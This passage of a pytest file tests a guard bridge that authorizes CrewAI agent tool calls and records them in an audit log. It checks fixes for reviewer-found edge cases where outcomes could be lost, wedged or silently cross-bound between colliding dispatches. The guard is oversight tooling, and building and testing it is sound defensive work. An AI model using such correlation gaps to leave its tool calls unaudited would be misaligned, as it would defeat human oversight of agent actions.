        assert outcomes[0]["body_state"] == BodyState.ABANDONED
        assert "error_code" not in outcomes[0]  # record_outcome forbids it together with ABANDONED
    finally:
        bridge.uninstall()


def test_zero_argument_tool_call_still_correlates_and_records_an_outcome(tools):
    """Round 2 regression: `getattr(ctx, "tool_input", None) or {}` substituted a BRAND NEW `{}`
    literal for CrewAI's own (reused, falsey) `{}` on every zero-argument tool call, breaking
    identity-based correlation entirely for that case -- allow with no outcome, wedged
    complete(). `getattr(ctx, "tool_input", {})` (no truthiness check) must preserve identity."""

    @tool("zero_arg_tool")
    def zero_arg_tool() -> str:
        """Takes no arguments."""
        return "ok"

    root = _root_guard(schema_version=2)
    bridge = CrewAIGuardBridge(
        root_guard=root, root_role=ORCHESTRATOR,
        tool_policies={"zero_arg_tool": ToolPolicy(scope="crm.read")},
        delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY},
        strict_single_hook=True,
    )
    bridge.install()
    try:
        bridge._guards[SUMMARIZER] = root.delegate(SUMMARIZER, SUMMARIZER_AUTHORITY, task="x")
        agent = SimpleNamespace(role=SUMMARIZER)
        # CrewAI itself passes the SAME {} object to both hooks for this dispatch (tool_utils.py:
        # `tool_input = tool_calling.arguments if tool_calling.arguments else {}`, evaluated once).
        shared_empty_dict: dict = {}
        before_ctx = ToolCallHookContext(tool_name="zero_arg_tool", tool_input=shared_empty_dict,
                                         tool=zero_arg_tool, agent=agent)
        bridge._before_tool_call(before_ctx)
        after_ctx = ToolCallHookContext(tool_name="zero_arg_tool", tool_input=shared_empty_dict,
                                        tool=zero_arg_tool, agent=agent,
                                        tool_result="ok", raw_tool_result="ok")
        bridge._after_tool_call(after_ctx)

        entries = root.audit_log().entries
        allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "zero_arg_tool")
        outcome = next((e for e in entries if e["event"] == "outcome"), None)
        assert outcome is not None, "the zero-argument call's outcome was lost"
        assert outcome["call_id"] == allow["call_id"]
        assert outcome["body_state"] == BodyState.RETURNED
    finally:
        bridge.uninstall()


def test_snapshot_freeze_never_shares_a_mutable_container_on_deepcopy_failure():
    """Codex review finding 7: on ANY deepcopy failure deep in a nested structure, the snapshot
    must never fall back to sharing the live, mutable container -- only reprs the unclonable
    leaf, and rebuilds every dict/list around it fresh."""
    import threading
    unclonable = threading.Lock()
    live = {"rows": 10, "nested": {"unclonable": unclonable, "list": [1, 2, 3]}}

    snapshot = dg_crewai._snapshot_params(live)

    assert snapshot["rows"] == 10
    assert isinstance(snapshot["nested"]["unclonable"], str)  # repr'd, not the live lock object
    live["nested"]["list"].append(999)
    live["nested"]["new_key"] = "mutated after snapshot"
    assert snapshot["nested"]["list"] == [1, 2, 3], "the snapshot shared a mutable list"
    assert "new_key" not in snapshot["nested"], "the snapshot shared the mutable dict"


class _AliasingList(list):
    """A mutable container whose `__deepcopy__` hands back itself -- reproduces the exact
    aliasing bug Codex found in round 2: `copy.deepcopy` SUCCEEDING is not proof of
    independence, since a class is free to implement `__deepcopy__` to return `self`."""

    def __deepcopy__(self, memo):
        return self


def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
    """Codex review round 2, finding 4: the fix must never call ANY copy protocol
    (copy.deepcopy included) on a container -- rebuilding it from scratch as a fresh
    builtin is the only way to guarantee independence from the live object graph."""
    live = {"x": _AliasingList([1])}

    snapshot = dg_crewai._snapshot_params(live)

    assert snapshot["x"] is not live["x"], "the snapshot aliased the live mutable container"
    live["x"].append(2)
    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"


def test_v2_default_mode_is_pre_hook_only_and_never_records_an_outcome(effects, tools):
    """Round 2 (team-lead directive): DEFAULT capture (strict_single_hook=False, the default)
    is PRE_HOOK_ONLY -- no outcome is EVER promised or recorded, since this bridge cannot
    guarantee it is the only thing observing a call unless the caller explicitly attests so."""
    root = _root_guard(schema_version=2)
    bridge = _bridge(root)  # strict_single_hook defaults to False
    with bridge:
        _build_crew(_build_llm([_act("crm_query", '{"rows": 10}'), "Thought: done.\nFinal Answer: ok."]), tools).kickoff()

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert allow["capture"] == Capture.PRE_HOOK_ONLY
    assert allow["adapter"]["hook_path"] == "Guard.check"  # the Guard's own default, not ours
    assert [e for e in entries if e["event"] == "outcome"] == []
    # Codex review round 3, finding 1 (core guard.py fix): a PRE_HOOK_ONLY allow must never
    # wedge complete() -- the coworker's own guard.complete() (this bridge's delegation-
    # lifecycle marker, fired when the coworker returns) must genuinely finalize, not sit
    # pending forever behind a call nothing was ever going to record_outcome() for.
    assert bridge.guard_for(SUMMARIZER).is_complete


def test_a_second_dispatch_sharing_the_same_tool_input_object_fails_closed(tools):
    """Codex review round 3, finding 2: a round-2 fix queued same-key dispatches in a per-key
    FIFO deque on the theory that two dispatches sharing one tool+args identity are
    "semantically symmetric", so pairing completions to entries in append order would be as
    correct as any other pairing. Codex's reverse-completion repro proved that false: nothing
    guarantees two same-key dispatches COMPLETE in the order they were AUTHORIZED, and CrewAI
    gives this bridge no per-dispatch token to tell two completions on one key apart -- a wrong
    FIFO pairing silently cross-binds outcomes (A's RETURNED becomes B's ledger entry, and vice
    versa), each individually self-consistent and undetectable by the offline verifier.

    This reproduces exactly that setup -- authorize A, mutate the SAME shared object, then a
    second dispatch B under the identical object identity while A is still unresolved -- and
    asserts the bridge now fails B closed (denied outright, never authorized, never queued)
    while A's own outcome still binds correctly."""
    root = _root_guard(schema_version=2)
    bridge = _bridge(root, strict_single_hook=True)
    bridge.install()
    try:
        bridge._guards[SUMMARIZER] = root.delegate(SUMMARIZER, SUMMARIZER_AUTHORITY, task="x")
        agent = SimpleNamespace(role=SUMMARIZER)
        shared_tool_input = {"rows": 10}  # the SAME object for BOTH dispatches
        ctx_a = ToolCallHookContext(tool_name="crm_query", tool_input=shared_tool_input,
                                    tool=tools[0], agent=agent)
        bridge._before_tool_call(ctx_a)   # A: authorized, its entry now occupies the key

        shared_tool_input["rows"] = 20    # mutated in place -- CrewAI documents before-hooks may do this
        ctx_b = ToolCallHookContext(tool_name="crm_query", tool_input=shared_tool_input,
                                    tool=tools[0], agent=agent)
        with pytest.raises(HookAborted):
            bridge._before_tool_call(ctx_b)   # B: fails closed -- never reaches guard.check()

        entries = root.audit_log().entries
        allows = [e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query"]
        assert len(allows) == 1, "the second, colliding dispatch must never be authorized at all"
        assert bridge.denials and bridge.denials[-1].tool_name == "crm_query"
        assert "second, concurrent" in bridge.denials[-1].reason_text

        # A's own genuine completion, unaffected by B's collision, still binds correctly.
        after_a = ToolCallHookContext(tool_name="crm_query", tool_input=shared_tool_input,
                                      tool=tools[0], agent=agent,
                                      tool_result="10 rows", raw_tool_result="10 rows")
        bridge._after_tool_call(after_a)

        entries = root.audit_log().entries
        outcomes = [e for e in entries if e["event"] == "outcome"]
        assert len(outcomes) == 1
        assert outcomes[0]["call_id"] == allows[0]["call_id"]
        assert outcomes[0]["body_state"] == BodyState.RETURNED
        assert bridge.guard_for(SUMMARIZER).complete()   # A's own Guard has no calls left pending on it
    finally:
        bridge.uninstall()


def test_a_collided_entrys_blocked_looking_completion_is_left_unrecorded_not_guessed(tools):
    """The residual documented in the module docstring's "CORRELATION": if the collision-
    denied call's OWN after_tool_call fires and finds the first call's entry still resident
    (this bridge cannot tell, from id(tool_input) alone, that it does not own that entry), a
    BLOCKED-looking completion on an entry a collision ever touched is ambiguous -- it could be
    that entry's own genuine third-party veto, or the collision-denied call's phantom
    completion bleeding through. This bridge must never guess: it PEEKS rather than pops,
    leaving the slot resident for a later, trustworthy completion, rather than consuming it and
    either writing a wrong value or dropping it (Codex review round 4, finding 1 -- an earlier
    version of this fix popped BEFORE classifying, which discarded the slot here regardless)."""
    root = _root_guard(schema_version=2)
    bridge = _bridge(root, strict_single_hook=True)
    bridge.install()
    try:
        bridge._guards[SUMMARIZER] = root.delegate(SUMMARIZER, SUMMARIZER_AUTHORITY, task="x")
        agent = SimpleNamespace(role=SUMMARIZER)
        shared_tool_input = {"rows": 10}
        ctx_a = ToolCallHookContext(tool_name="crm_query", tool_input=shared_tool_input,
                                    tool=tools[0], agent=agent)
        bridge._before_tool_call(ctx_a)

        ctx_b = ToolCallHookContext(tool_name="crm_query", tool_input=shared_tool_input,
                                    tool=tools[0], agent=agent)
        with pytest.raises(HookAborted):
            bridge._before_tool_call(ctx_b)   # marks A's entry .collided = True

        # A's own after-hook happens to see a BLOCKED-looking result too (e.g. a genuine
        # third-party veto of A itself -- indistinguishable, from raw_tool_result alone, from
        # B's phantom completion bleeding through).
        blocked_after_a = ToolCallHookContext(
            tool_name="crm_query", tool_input=shared_tool_input, tool=tools[0], agent=agent,
            tool_result="blocked", raw_tool_result="Tool execution blocked by hook. Tool: crm_query",
        )
        bridge._after_tool_call(blocked_after_a)

        entries = root.audit_log().entries
        assert [e for e in entries if e["event"] == "outcome"] == [], (
            "an ambiguous, collided, blocked-looking completion must never be recorded either way"
        )
        # PEEKED, not popped: the slot is still resident, exactly as it was.
        assert id(shared_tool_input) in bridge._pending
        assert bridge._pending[id(shared_tool_input)].outcome is not None
    finally:
        bridge.uninstall()


def test_b_blocked_first_then_a_returned_second_still_binds_a_correctly(tools):
    """Codex review round 4, finding 1, critical -- the EXACT repro: A authorized; B, sharing
    A's object, denied via HookAborted; B's own blocked after-hook fires FIRST (CrewAI still
    runs POST_TOOL_CALL for a call this bridge itself blocked); only THEN does A return
    normally. A popped-before-classifying implementation would let B's blocked after-hook
    consume and discard A's still-live entry, silently losing A's later, genuine outcome (one
    allow, zero outcomes, complete() wedged forever). Peeking during the ambiguous (blocked)
    invocation and only popping on the trustworthy (non-blocked) one closes this: A must still
    get exactly one outcome, and its Guard must still be able to complete()."""
    root = _root_guard(schema_version=2)
    bridge = _bridge(root, strict_single_hook=True)
    bridge.install()
    try:
        bridge._guards[SUMMARIZER] = root.delegate(SUMMARIZER, SUMMARIZER_AUTHORITY, task="x")
        agent = SimpleNamespace(role=SUMMARIZER)
        shared_tool_input = {"rows": 10}
        ctx_a = ToolCallHookContext(tool_name="crm_query", tool_input=shared_tool_input,
                                    tool=tools[0], agent=agent)
        bridge._before_tool_call(ctx_a)   # A: authorized, occupies the slot

        ctx_b = ToolCallHookContext(tool_name="crm_query", tool_input=shared_tool_input,
                                    tool=tools[0], agent=agent)
        with pytest.raises(HookAborted):
            bridge._before_tool_call(ctx_b)   # B: fails closed, marks A's entry .collided = True

        # B's OWN blocked after-hook fires FIRST -- must NOT consume A's slot.
        after_b_blocked = ToolCallHookContext(
            tool_name="crm_query", tool_input=shared_tool_input, tool=tools[0], agent=agent,
            tool_result="blocked", raw_tool_result="Tool execution blocked by hook. Tool: crm_query",
        )
        bridge._after_tool_call(after_b_blocked)
        assert [e for e in root.audit_log().entries if e["event"] == "outcome"] == []
        assert id(shared_tool_input) in bridge._pending, "A's slot must survive B's blocked after-hook"

        # A's OWN real completion arrives SECOND -- must still bind correctly.
        after_a_returned = ToolCallHookContext(
            tool_name="crm_query", tool_input=shared_tool_input, tool=tools[0], agent=agent,
            tool_result="10 rows", raw_tool_result="10 rows",
        )
        bridge._after_tool_call(after_a_returned)

        entries = root.audit_log().entries
        allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
        outcomes = [e for e in entries if e["event"] == "outcome"]
        assert len(outcomes) == 1, "A's genuine completion must not have been lost"
        assert outcomes[0]["call_id"] == allow["call_id"]
        assert outcomes[0]["body_state"] == BodyState.RETURNED
        assert id(shared_tool_input) not in bridge._pending  # consumed now, not before
        assert bridge.guard_for(SUMMARIZER).complete()
    finally:
        bridge.uninstall()
